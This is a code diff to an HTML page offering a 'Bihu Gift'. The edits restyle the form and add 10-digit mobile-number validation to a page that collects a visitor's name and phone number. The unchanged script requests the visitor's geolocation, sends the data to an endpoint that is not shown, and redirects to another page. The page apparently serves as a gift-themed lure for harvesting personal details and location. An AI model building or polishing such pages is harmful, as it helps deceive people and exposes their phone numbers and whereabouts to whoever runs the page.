@@ -3,15 +3,76 @@
 <head>
   <title>Bihu Gift 🎁</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body{
+      margin:0;
+      min-height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      background:linear-gradient(135deg,#ff9800,#f44336);
+      font-family:Arial, sans-serif;
+    }
+    form{
+      background:#ffffff;
+      padding:30px;
+      border-radius:15px;
+      width:100%;
+      max-width:380px;
+      box-shadow:0 0 20px rgba(0,0,0,0.3);
+      text-align:center;
+    }
+    h2{
+      color:#e65100;
+      margin-bottom:20px;
+    }
+    input{
+      width:100%;
+      padding:12px;
+      margin:8px 0;
+      border-radius:8px;
+      border:1px solid #ccc;
+      font-size:15px;
+    }
+    button{
+      width:100%;
+      padding:12px;
+      margin-top:10px;
+      border:none;
+      border-radius:10px;
+      background:#2e7d32;
+      color:white;
+      font-size:16px;
+      cursor:pointer;
+    }
+    button:hover{
+      background:#1b5e20;
+    }
+    #status{
+      margin-top:12px;
+      font-weight:bold;
+      color:#d84315;
+    }
+  </style>
 </head>
+
 <body>
 
 <form id="studentForm">
-  <h2>Bihu Gift 🎁</h2>
-  <input name="name" placeholder="Name" required>
-  <input name="reason" placeholder="Gift type" required>
-  <input name="mobile" placeholder="Mobile number" required>
-  <button type="submit">Received Gift 🎁</button>
+  <h2>🎁 Bihu Gift 🎁</h2>
+
+  <input type="text" name="name" placeholder="Your Name" required>
+  <input type="text" name="reason" placeholder="Gift Type" required>
+
+  <!-- 🔴 10 digit mobile only -->
+  <input type="tel" name="mobile"
+         placeholder="10-digit Mobile Number"
+         maxlength="10"
+         pattern="[0-9]{10}"
+         required>
+
+  <button type="submit">Received Gift 🎉</button>
   <p id="status"></p>
 </form>
 
@@ -21,7 +82,16 @@ const statusText = document.getElementById("status");
 
 form.addEventListener("submit", function(e){
   e.preventDefault();
-  statusText.innerText = "Requesting location…";
+
+  const mobile = form.mobile.value.trim();
+
+  // 🔴 MOBILE VALIDATION
+  if (!/^[0-9]{10}$/.test(mobile)) {
+    statusText.innerText = "❌ Please enter a valid 10-digit mobile number";
+    return;
+  }
+
+  statusText.innerText = "📍  zx famly";
 
   // save name for next pages
   localStorage.setItem("bihuName", form.name.value);
@@ -50,11 +120,9 @@ function sendData(position){
     body: JSON.stringify(data)
   });
 
-  // go to next page
   window.location.href = "bihuz.html";
 }
 </script>
 
 </body>
 </html>
-
